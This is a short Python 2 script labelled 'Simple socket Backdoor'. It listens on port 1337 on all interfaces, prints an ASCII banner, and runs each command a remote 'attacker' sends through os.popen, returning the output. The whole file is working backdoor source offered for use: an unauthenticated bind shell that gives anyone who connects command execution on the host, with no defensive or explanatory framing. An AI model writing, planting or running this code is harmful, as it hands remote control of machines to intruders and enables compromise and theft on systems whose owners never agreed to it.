#Simple socket Backdoor

 
import socket
import sys
import os
from thread import *

HOST = ''   #all available interfaces
PORT = 1337 # port
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    sys.exit()
     
#Start listening on socket
s.listen(10)

#Handles connections
def clientthread(conn):
    #Sending message to connected attacker
    conn.send('''       .__           .__  .__                 __    
  _____|  |__   ____ |  | |  |   ____   _____/  |_  
 /  ___/  |  \_/ __ \|  | |  |  /    \_/ __ \   __\ 
 \___ \|   Y  \  ___/|  |_|  |_|   |  \  ___/|  |   
/____  >___|  /\___  >____/____/___|  /\___  >__|   
     \/     \/     \/               \/     \/




''')
    #loop.
    while True:
         
        #Receiving from attacker
        data = conn.recv(1024).replace("\r","")

        #run commands
        conn.sendall(os.popen(data).read()+"\n")
        if not data: 
            break
     
     
    #came out of loop
    conn.close()
 
#listen for attacker
while 1:
    #wait to accept a connection
    conn, addr = s.accept()

    #start new thread
    start_new_thread(clientthread ,(conn,))
 
s.close()
